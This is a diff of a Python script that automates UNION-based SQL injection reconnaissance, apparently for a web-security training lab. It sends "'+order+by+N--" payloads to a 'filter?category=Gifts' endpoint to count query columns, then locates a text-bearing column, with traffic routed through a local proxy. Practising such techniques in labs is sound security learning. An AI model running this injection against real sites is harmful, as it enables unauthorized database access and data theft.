@@ -11,7 +11,7 @@ proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
-def get_exploit_column_number(url):
+def get_column_number(url):
     path = "filter?category=Gifts"
     for number in range(1,50):
         payload = "'+order+by+%s--" %number
@@ -23,7 +23,7 @@ def get_exploit_column_number(url):
             return number - 1
     raise ValueError("Max number of tries exceeded, 50")
 
-def get_exploit_string_field(
+def get_string_field(
         url,
         column_number, 
         string_to_retrieve):
@@ -49,9 +49,9 @@ if __name__ == "__main__":
         url = sys.argv[1]
         string_to_retrieve = sys.argv[2].strip()
         print("[+] Figuring out number of columns...")
-        column_number = get_exploit_column_number(url)
+        column_number = get_column_number(url)
         print("[+] The number of columns is " + str(column_number) + "." )
-        string_column_number = get_exploit_string_field(url, column_number, string_to_retrieve)
+        string_column_number = get_string_field(url, column_number, string_to_retrieve)
         print("[+] The column that contains text is " + str(string_column_number) + ".")
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
